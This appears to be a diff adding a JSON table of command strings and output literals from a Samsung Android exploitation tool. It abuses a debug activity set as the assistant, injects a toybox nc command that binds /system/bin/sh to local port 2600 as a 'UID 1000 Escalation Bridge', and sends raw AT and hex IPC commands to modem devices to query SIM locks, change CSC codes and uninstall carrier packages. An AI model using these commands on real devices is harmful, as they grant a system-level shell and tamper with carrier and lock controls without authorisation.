@@ -1,0 +1,327 @@
+{
+ "defines": [
+  [
+   "CMD_FLUSH_RADIO_LOGS",
+   "logcat -b radio -c > /dev/null 2>&1"
+  ],
+  [
+   "CMD_SET_SCREEN_TIMEOUT",
+   "settings put system screen_off_timeout 600000 > /dev/null 2>&1"
+  ],
+  [
+   "CMD_SET_ASSISTANT_SECURE",
+   "settings put Secure assistant com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1"
+  ],
+  [
+   "CMD_SET_ASSISTANT_SYSTEM",
+   "settings put system assistant com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1"
+  ],
+  [
+   "CMD_SET_DOUBLEPRESS_GLOBAL",
+   "settings put global function_key_config_doublepress_value com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1"
+  ],
+  [
+   "CMD_LAUNCH_SETTINGS",
+   "am start -a android.settings.SETTINGS > /dev/null 2>&1"
+  ],
+  [
+   "CMD_TRIGGER_ASSIST_KEY",
+   "input keyevent 219 > /dev/null 2>&1"
+  ],
+  [
+   "CMD_INJECT_NC_ROOT_SHELL",
+   "input text 'toybox nc -s 127.0.0.1 -p 2600 -L /system/bin/sh'"
+  ],
+  [
+   "CMD_KEYEVENT_ENTER",
+   "input keyevent 66 > /dev/null 2>&1"
+  ],
+  [
+   "CMD_KEYEVENT_TAB",
+   "input keyevent 61 > /dev/null 2>&1"
+  ],
+  [
+   "CMD_KEYEVENT_HOME",
+   "input keyevent 3 > /dev/null 2>&1"
+  ],
+  [
+   "CMD_KEYEVENT_MENU",
+   "input keyevent 82 > /dev/null 2>&1"
+  ],
+  [
+   "CMD_LAUNCH_SAMSUNG_HIDDEN_MENU",
+   "am start -n com.sec.hiddenmenu/.IOTHiddenMenu -e 7267864872 72678647376477466 > /dev/null 2>&1"
+  ],
+  [
+   "CMD_CHECK_SKT_UNLOCK",
+   "pm list packages | grep com.skatd.unlock"
+  ],
+  [
+   "CMD_CLEAR_FACTORY_TEST",
+   "pm clear com.samsung.android.FactoryTestLauncher > /dev/null 2>&1"
+  ],
+  [
+   "CMD_CLEAR_AUDIO_DEBUG",
+   "pm clear com.sec.android.app.audiocoredebug > /dev/null 2>&1"
+  ],
+  [
+   "CMD_DUMP_UI_HIERARCHY",
+   "uiautomator dump /sdcard/window_dump.xml > /dev/null 2>&1"
+  ],
+  [
+   "CMD_CAT_UI_HIERARCHY",
+   "cat /sdcard/window_dump.xml"
+  ],
+  [
+   "CMD_CLEAN_UI_DUMP",
+   "rm -rf /sdcard/window_dump.xml > /dev/null 2>&1"
+  ],
+  [
+   "AT_CMD_TEST",
+   "AT\\r\\n"
+  ],
+  [
+   "AT_CMD_PRECONFG_READ",
+   "AT+PRECONFG=1,0\\r\\n"
+  ],
+  [
+   "AT_CMD_PRECONFG_WRITE_FMT",
+   "AT+PRECONFG=2,%s\\r\\n"
+  ],
+  [
+   "AT_CMD_REBOOT_RADIO",
+   "AT+CFUN=1,1\\r\\n"
+  ],
+  [
+   "AT_CMD_MODEM_FACTORY_RESET",
+   "AT+FACTORST=0,0\\r\\n"
+  ],
+  [
+   "AT_CMD_DEVCONINFO",
+   "AT+DEVCONINFO\\r\\n"
+  ],
+  [
+   "AT_CMD_KSTRINGB",
+   "AT+KSTRINGB=0,3\\r\\n"
+  ],
+  [
+   "AT_CMD_IMEI_QUERY",
+   "+IMEITEST:1,\\r\\n"
+  ],
+  [
+   "AT_CMD_SIM_STATUS",
+   "AT+CPIN?\\r\\n"
+  ],
+  [
+   "AT_CMD_QUERY_NETWORK_LOCK",
+   "AT+CLCK=\\\"PN\\\",2\\r\\n"
+  ],
+  [
+   "AT_CMD_QUERY_SUBSET_LOCK",
+   "AT+CLCK=\\\"PU\\\",2\\r\\n"
+  ],
+  [
+   "AT_CMD_QUERY_SP_LOCK",
+   "AT+CLCK=\\\"PP\\\",2\\r\\n"
+  ],
+  [
+   "AT_CMD_QUERY_CORP_LOCK",
+   "AT+CLCK=\\\"PC\\\",2\\r\\n"
+  ],
+  [
+   "AT_CMD_QUERY_SIM_LOCK",
+   "AT+CLCK=\\\"SC\\\",2\\r\\n"
+  ],
+  [
+   "PKG_AUDIO_DEBUG",
+   "com.sec.android.app.audiocoredebug"
+  ],
+  [
+   "ACT_AUDIO_DEBUG_SHELL",
+   "com.sec.android.app.audiocoredebug.AudioAdbShellActivity"
+  ],
+  [
+   "PKG_HIDDEN_MENU",
+   "com.sec.hiddenmenu"
+  ],
+  [
+   "ACT_IOT_HIDDEN_MENU",
+   "com.sec.hiddenmenu.IOTHiddenMenu"
+  ],
+  [
+   "PKG_FACTORY_TEST",
+   "com.samsung.android.FactoryTestLauncher"
+  ],
+  [
+   "PKG_RETAIL_MODE",
+   "com.samsung.rms.retailagent.global"
+  ],
+  [
+   "PKG_SKT_UNLOCK",
+   "com.skatd.unlock"
+  ],
+  [
+   "PKG_FOTA_AGENT",
+   "com.sdet.fotaagent"
+  ],
+  [
+   "PROTO_PREFIX_CSC",
+   "CSC:"
+  ],
+  [
+   "PROTO_PREFIX_AT",
+   "AT:"
+  ],
+  [
+   "PROTO_PREFIX_HEX",
+   "HEX:"
+  ],
+  [
+   "PROTO_CMD_SCAN",
+   "SCAN"
+  ],
+  [
+   "PROTO_CMD_STATUS",
+   "STATUS"
+  ],
+  [
+   "PROTO_CMD_LOCKS",
+   "LOCKS"
+  ],
+  [
+   "PROTO_CMD_RECONNECT",
+   "RECONNECT"
+  ],
+  [
+   "PROTO_CMD_HELP",
+   "HELP"
+  ],
+  [
+   "PROTO_CMD_EXIT",
+   "EXIT"
+  ],
+  [
+   "PROTO_CMD_QUIT",
+   "QUIT"
+  ],
+  [
+   "TELEMETRY_FORMAT_STRING",
+   "INFO|MODEL=%s|CSC=%s|AND=%s|PATCH=%s|DBG=%s|UID=%d|CH=%s\\n"
+  ]
+ ],
+ "literals": [
+  "[+] UID 1000 Escalation Bridge confirmed on port %d\\n",
+  "/dev/umts_ipc0",
+  "/dev/umts_ipc1",
+  "/dev/umts_rfs0",
+  "/dev/diag",
+  "/dev/umts_atc0",
+  "/dev/umts_atc1",
+  "/dev/umts_at0",
+  "/dev/at_distributor",
+  "/dev/at_distributor0",
+  "/dev/smd11",
+  "/dev/smd0",
+  "/dev/smd7",
+  "/dev/ttyGS0",
+  "/dev/ttyACM0",
+  "/dev/ttyUSB0",
+  "/dev/socket/rild",
+  "/dev/socket/rild-oem",
+  "/dev/socket/rild-debug",
+  "/dev/socket/rild2",
+  "/dev/socket/qmux_radio/qmux_client_socket0",
+  "/dev/socket/",
+  "[+] %s: Found (TTY AT - %s)\\n",
+  "Read/Write OK",
+  "[+] %s: Found (Direct IPC - %s)\\n",
+  "[%c] %s: Found (%s)\\n",
+  "%s\\r\\n",
+  "AT+CPIN?",
+  "AT+CLCK=\\\"PN\\\",2",
+  "AT+CLCK=\\\"PU\\\",2",
+  "AT+CLCK=\\\"PP\\\",2",
+  "AT+CLCK=\\\"PC\\\",2",
+  "ERROR",
+  "MODEM_ERROR",
+  "+CLCK: 0",
+  "+CLCK:0",
+  "+CLCK: 1",
+  "+CLCK:1",
+  "  SIM State (CPIN)             : %s\\n",
+  "  Network Lock (CLCK:PN)       : %s\\n",
+  "  Network Subset Lock (CLCK:PU): %s\\n",
+  "  Service Provider Lock (PP)   : %s\\n",
+  "  Corporate Lock (CLCK:PC)     : %s\\n",
+  "SIMLOCK|CPIN=%s|PN=%s|PU=%s|PP=%s|PC=%s\\n",
+  "[ERROR] Invalid CSC code: %s (must be 2-5 uppercase chars)\\n",
+  ".ERR_CSC_INVALID..\\n",
+  "[*] Starting Samsung CSC change to: %s (Hex: %s)\\n",
+  "0601000E0000%s0000%s",
+  "  [1/5] Injecting: %s\\n",
+  "060100090000%s",
+  "  [2/5] Injecting: %s\\n",
+  "060100120000%s0000%s%s",
+  "  [3/5] Injecting: %s\\n",
+  "  [4/5] Injecting: %s\\n",
+  "  [5/5] Injecting: %s\\n",
+  "[*] CSC change sequence completed for: %s\\n",
+  "pm uninstall -k --user 0 com.sec.android.AutoPreconfig 2>/dev/null",
+  "pm uninstall -k --user 0 com.sec.omadmspr 2>/dev/null",
+  "logcat -b radio -c 2>/dev/null",
+  "[+] Samsung CSC change successful.\\n",
+  ".OK_CSC..\\n",
+  "INFO|MODEL=%s|CSC=%s|AND=%s|PATCH=%s|DBG=%s|UID=%d|CH=%s\\n",
+  "  Product Brand  : %s\\n",
+  "  Product Model  : %s\\n",
+  "  Serial Number  : %s\\n",
+  "  Device Carrier : %s\\n",
+  "  Android Version: %s\\n",
+  "  Security Patch : %s\\n",
+  "  Debug Level    : %s\\n",
+  "  Process UID    : %d\\n",
+  "  Active Channel : %s (%s)\\n",
+  "Usage: %s [OPTIONS]\\n\\n",
+  "One-Shot CLI Options:\\n",
+  "  -c <CSC>       Quick Samsung CSC change (e.g. -c XAA)\\n",
+  "  -a <AT_CMD>    Send single AT command and exit (e.g. -a AT+DEVCONINFO)\\n",
+  "  -s             Scan mode: list accessible modem & RIL devices\\n",
+  "  -d <DEVICE>    Force specific modem device path (e.g. -d /dev/umts_atc0)\\n",
+  "  -p <PORT>      Escalation port (default: 2600)\\n",
+  "Interactive Commands (run without options):\\n",
+  "  CSC:<CODE>     Automated 5-packet Samsung CSC change\\n",
+  "  AT:<CMD>       Send raw AT command (e.g. AT:AT+DEVCONINFO)\\n",
+  "  HEX:<DATA>     Send hex IPC command (or raw hex without prefix)\\n",
+  "  SCAN           Scan and report accessible modem channels\\n",
+  "  STATUS         Display full device, channel and SIM lock status\\n",
+  "  LOCKS          Query SIM & Network lock status (CPIN, CLCK)\\n",
+  "  RECONNECT      Re-probe and reconnect best modem channel\\n",
+  "  MODE:AT        Switch to AT text channel (/dev/umts_atc0)\\n",
+  "  MODE:IPC       Switch to IPC / RIL socket channel (/dev/socket/rild)\\n",
+  "  AUTH:<SEED>    Activate dynamic Xorshift32 stream cipher\\n",
+  "  HELP           Show this interactive help\\n",
+  "  EXIT, QUIT     Terminate bridge session\\n",
+  "%s\\n",
+  ".ERR_AT_TIMEOUT..\\n",
+  ".ERR_IPC..\\n",
+  ".ERR_HEX_SYNTAX..\\n",
+  "EXIT",
+  "QUIT",
+  "HELP",
+  "SCAN",
+  "STATUS",
+  "LOCKS",
+  "RECONNECT",
+  ".CH=%s..\\n<< ",
+  "AUTH:",
+  ".OK_AUTH..\\n<< ",
+  "CSC:",
+  "MODE:AT",
+  "MODE:IPC",
+  "AT:",
+  "HEX:",
+  ".OK..%s#\\n",
+  ".OK..#\\n",
+  ".ERR_SYNTAX..\\n"
+ ]
+}
